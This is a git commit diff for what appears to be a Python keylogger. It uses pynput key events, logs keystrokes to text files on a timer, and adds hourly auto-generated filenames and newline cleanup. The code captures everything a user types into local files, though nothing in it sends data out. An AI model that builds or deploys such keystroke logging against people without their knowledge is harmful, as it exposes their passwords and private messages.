d91969159b6f0794971059fe045528c3ea722b51
Carlo Acosta <acostacarlom@gmail.com>
2022-09-29 08:45:45 +0800

    Added feature to autogenerate name

--- file_handler.py
+++ file_handler.py
@@ -1,6 +1,6 @@
 import threading
 import time
-from helper_funcs import convert_key_to_string
+from helper_funcs import convert_key_to_string, generateFilename
 
 class FileHandler:
     def __init__(self, filename, timer_count) -> None:
@@ -14,7 +14,8 @@ class FileHandler:
 
     def print_key_to_file(self, key) -> None:
         key_as_text = convert_key_to_string(key, self.items_to_print)
-        self.items_to_print.append(key_as_text)
+        if (key_as_text != None):
+            self.items_to_print.append(key_as_text)
 
         if self.timer_thread == None or (not self.timer_thread.is_alive()):
             self.timer_thread = threading.Thread(target=self.__printing_timer)
@@ -31,7 +32,11 @@ class FileHandler:
         self.timer_thread = None
 
     def __print(self) -> None:
-        with open(self.filename, 'a') as out:
+        filename = self.filename
+        if (filename == 'AUTO'):
+            filename = generateFilename()
+
+        with open(filename, 'a') as out:
             for item in self.items_to_print:
                 out.write(item)
 
--- helper_funcs.py
+++ helper_funcs.py
@@ -1,17 +1,20 @@
 from pynput.keyboard import Key
+from datetime import datetime
 
 def convert_key_to_string(key, printing_array) -> str:
-    if (key == Key.space or key == Key.enter):
-        return '\n'
-    
-    key_str = str(key).replace("'", "")
+    if (key == None):
+        return None
 
+    last_elem = printing_array[-1] if len(printing_array) > 0 else ''
+
+    if (key == Key.space or key == Key.enter or key == Key.backspace):
+        return '\n' if last_elem != '\n' else None
+
+    key_str = str(key).replace("'", "")
     if keyIsSpecialKeyCode(key_str) or keyIsKeyboardShortcut(key_str):
         prefix = ''
-        if len(printing_array) > 0:
-            last_elem = printing_array[-1]
-            if not keyIsSpecialKeyCode(last_elem) and not keyIsKeyboardShortcut(last_elem):
-                prefix=f'\n'
+        if not keyIsSpecialKeyCode(last_elem) and not keyIsKeyboardShortcut(last_elem):
+            prefix=f'\n'
 
         return f'{prefix}{key_str}\n'
 
@@ -22,3 +25,8 @@ def keyIsSpecialKeyCode(key_str) -> bool:
 
 def keyIsKeyboardShortcut(key_str) -> bool:
     return key_str.find('\\x') != -1
+
+def generateFilename() -> str:
+    current_time = datetime.now()
+    filename = current_time.strftime('%d-%m-%Y_%I %p')
+    return f'{filename}.txt'
